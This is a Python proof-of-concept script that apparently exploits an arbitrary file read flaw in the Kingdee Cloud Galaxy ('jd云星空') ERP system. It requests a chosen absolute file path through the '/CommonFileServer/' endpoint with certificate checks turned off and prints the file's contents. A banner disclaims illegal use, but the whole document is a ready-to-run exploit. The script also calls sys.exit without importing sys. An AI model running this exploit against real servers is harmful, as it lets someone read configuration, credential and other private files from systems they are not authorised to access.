import requests
import time
import argparse

def title():
    print("")
    print("")
    print('+------------------------------------------------------------')
    print('jd云星空任意文件读取-----漏洞检测------------------------------')
    print("仅限学习使用或安全排查使用，请勿用于非法测试！")
    print('使用方式：jdyk_read.py -u http://www.example.com -file 文件绝对路径')
    print('+------------------------------------------------------------')
    print("")
def poc(url,file):
    headers= {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"
    }
    # 无视证书不报错
    requests.packages.urllib3.disable_warnings()
    try:
        req=requests.get(url+"/CommonFileServer/"+file,headers=headers,timeout=10,verify=False)
    except:
        print("请检查目标是否可访问")
        sys.exit()
    print(req.text)
def arg():
    parser = argparse.ArgumentParser(description="Simple command line tool")
    parser.add_argument("-u", "--url", required=True, help="URL to target")
    parser.add_argument("-file", "--filename", required=True, help="File to retrieve")
    args = parser.parse_args()
    url = args.url
    filename = args.filename
    return url,filename

if __name__ == '__main__':
    title()
    url,file=arg()
    poc(url,file)